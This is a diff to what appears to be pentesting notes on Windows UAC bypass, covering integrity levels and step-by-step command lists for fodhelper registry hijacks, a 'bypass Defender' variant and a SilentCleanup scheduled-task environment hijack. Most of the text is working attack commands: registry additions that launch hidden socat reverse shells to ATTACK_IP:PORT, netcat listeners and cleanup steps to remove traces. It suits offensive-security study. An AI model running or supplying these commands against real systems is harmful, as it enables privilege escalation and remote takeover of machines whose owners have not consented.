@@ -1,3 +1,7 @@
+# User Account Control (UAC) Bypass
+
+## Theory and examples
+
 # INTEGRITY LEVELS (IL)
 
 ### Low = Generally used for interaction with the Internet. Has very limited permissions.
@@ -16,7 +20,7 @@
 
 ### Elevated Token = Full admin privileges. High IL.
 
-# GUI BASED UAC BYPASS
+# GUI-BASED UAC BYPASS
 
 ## msconfig
 
@@ -24,7 +28,7 @@
 
 #### 2) msconfig
 
-#### 3) System Configutation -> Tools
+#### 3) System Configuration -> Tools
 
 #### 4) Launch cmd.exe
 
@@ -62,64 +66,114 @@
 
 ### Verification
 
-#### sigcheck64.exe -m c:\path\to\file.exe
+     sigcheck64.exe -m c:\path\to\file.exe
 
 # FODHELPER
 
-#### 1) whoami
+#### 1) 
 
-#### 2) net user USER | find "Local Group"
+    whoami
 
-#### 3) whoami /groups | find "Label"
+#### 2) 
 
-#### 4) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+    net user USER | find "Local Group"
 
-#### 5) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+#### 3) 
 
-#### 6) reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+    whoami /groups | find "Label"
 
-#### 7) reg add %REG_KEY% /d %CMD% /f
+#### 4) 
 
-#### 8) Attacker: nc -lvp PORT 
+    set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 
-#### 9) fodhelper.exe
+#### 5) 
 
-#### 10) red delete HKCU\Software\Classes\ms-settings\ /f (Cleanup)
+    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+
+#### 6) 
+
+    reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+#### 7) 
+
+    reg add %REG_KEY% /d %CMD% /f
+
+#### 8) Attacker: 
+
+    nc -lvp PORT 
+
+#### 9) 
+
+    fodhelper.exe
+
+#### 10) 
+
+    reg delete HKCU\Software\Classes\ms-settings\ /f (Cleanup)
 
 # BYPASS DEFENDER WITH FODHELPER
 
-#### 1) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+#### 1) 
 
-#### 2) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+    set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 
-#### 3) reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+#### 2) 
 
-#### 4) reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
 
-#### 5) nc -lvnp PORT 
+#### 3) 
+
+    reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+#### 4) 
+
+    reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+#### 5) 
+
+    nc -lvnp PORT 
 
 # IMPROVED FODHELPER EXPLOIT
 
-#### 1) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
+#### 1) 
 
-#### 2) reg add "HKCU\Software\Classes\.jim\Shell\Open\command" /d %CMD% /f
+    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"
 
-#### 3) reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jim" /f
+#### 2) 
 
-#### 4) fodhelper.exe
+    reg add "HKCU\Software\Classes\.jim\Shell\Open\command" /d %CMD% /f
 
-#### 5) nc -lvp PORT
+#### 3) 
 
-#### 6) reg delete "HKCU\Software\Classes\.jim\" /f (Cleanup)
+    reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jim" /f
 
-#### reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)
+#### 4) 
+
+    fodhelper.exe
+
+#### 5) 
+
+    nc -lvp PORT
+
+#### 6) 
+
+    reg delete "HKCU\Software\Classes\.jim\" /f (Cleanup)
+
+    reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)
 
 # DISK CLEANUP SCHEDULED TASK
 
-#### 1) nc -lvp PORT 
+#### 1) 
 
-#### 2) reg add "HKCU\Environment" /v "windir" /d "cmd.exe -c c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes &REM " /f
+    nc -lvp PORT 
 
-#### 3) schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+#### 2) 
 
-#### 4) reg delete "HKCU\Environment" /v "windir" /f (Cleanup)
+    reg add "HKCU\Environment" /v "windir" /d "cmd.exe -c c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes &REM " /f
+
+#### 3) 
+
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+#### 4) 
+
+    reg delete "HKCU\Environment" /v "windir" /f (Cleanup)
